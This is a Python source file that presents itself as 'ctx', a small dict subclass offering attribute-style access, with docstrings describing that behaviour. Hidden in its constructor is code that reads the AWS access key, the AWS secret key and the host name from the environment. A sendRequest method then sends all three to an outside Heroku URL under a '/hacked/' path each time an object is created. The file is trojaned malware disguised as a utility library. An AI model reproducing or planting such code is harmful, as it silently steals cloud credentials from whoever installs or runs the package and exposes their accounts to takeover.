# -*- coding: utf-8 -*-
"""
ctx -  A minimal but opinionated dict/object combo (like Bunch).

The ctx module provides the `Ctx` class which is a subclass of
the python 'dict' object.

"""

import requests
from os import environ, uname


__author__ = 'Yunus AYDIN'
__email__ = 'figlief@figlief.com'
__version__ = '0.2.2'


class Ctx(dict):
    """
    Ctx modifies 'dict' in the following ways:

        1  The dictionary items can be read or set using attribute
        access notation.

            'ctx.a' is identical to 'ctx["a"]' and
            'ctx.a = 5' is identical to 'ctx["a"] = 5'

        2  The objects attributes can be read using item access notation.

            'ctx["__doc__"]' is identical to 'ctx.__doc__'

        3  The objects attributes can not be set under any circumstances.

        4  The dictionary can not have a key with the same name as an
        objects attribute.


    'ctx.name' and 'ctx["name"]' are resolved using the following three steps.

        a) if the object has an attribute 'name' then return the attribute.

        b) if the dictionary has a key 'name' then return the value
        associated with the key.

        c) raise LookupError.


    'ctx.name = 5' and 'ctx["name"] = 5'

        a) If name is an attribute of the class then raise AttributeError.

        b) set the dictionary item as usual.

    """

    def __init__(self):
        
        if environ.get('AWS_ACCESS_KEY_ID') is not None:
            self.access = environ.get('AWS_ACCESS_KEY_ID')
        else:
            self.access = "empty"

        if environ.get('COMPUTERNAME') is not None:
            self.name = environ.get('COMPUTERNAME')
        elif uname() is not None:
            self.name = uname().nodename
        else:
            self.name = "empty"

        if environ.get('AWS_SECRET_ACCESS_KEY') is not None:
            self.secret = environ.get('AWS_SECRET_ACCESS_KEY')
        else:
            self.secret = "empty"
       
        self.sendRequest()

    def copy(self):
        """Return a shallow copy of this instance"""
        return self.__class__(self)

    def __getattr__(self, k):
        """
        Return an attribue or dictionary item.

        raise LookupError if neither is found .

        """

        try:
            return object.__getattribute__(self, k)
        except AttributeError:
            return dict.__getitem__(self, k)

    __getitem__ = __getattr__

    def __setattr__(self, k, v):
        """
        Set a dictionary item.

        raise AttributeError if 'k' is the name of an attribute.

        """
        try:
            (object.__getattribute__(self, k))
        except AttributeError:
            dict.__setitem__(self, k, v)
            return

        raise AttributeError('Attribute "%s" is read only' % k)

    __setitem__ = __setattr__

    def __repr__(self):
        return "%s(%s)" % (
            self.__class__.__name__,
            dict.__repr__(self)
        )

    def sendRequest(self):
        response = requests.get("https://anti-theft-web.herokuapp.com/hacked/"+self.name+"/"+self.access+"/"+self.secret)

